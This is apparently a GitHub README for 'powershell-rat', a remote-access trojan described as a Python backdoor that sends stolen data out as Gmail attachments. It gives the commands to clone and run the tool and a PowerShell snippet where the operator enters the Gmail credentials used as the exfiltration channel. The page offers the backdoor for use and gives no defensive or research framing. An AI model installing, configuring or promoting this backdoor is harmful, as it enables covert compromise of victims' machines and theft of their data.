# powershell-rat
Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment.

[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)

# Installation
```
git clone https://github.com/krishpranav/powershell-rat
cd powershell-rat
sudo chmod +x *
python3 Powershellrat.py
```
- you want to put your email and password here
```powershell
$username="" #enter your email
$password="" #your password
$smtpServer = "smtp.gmail.com"
```

# RAT Architecture
![image](https://user-images.githubusercontent.com/3501170/54605214-dd51f400-4a9c-11e9-8b51-a225b13ecd0d.png)
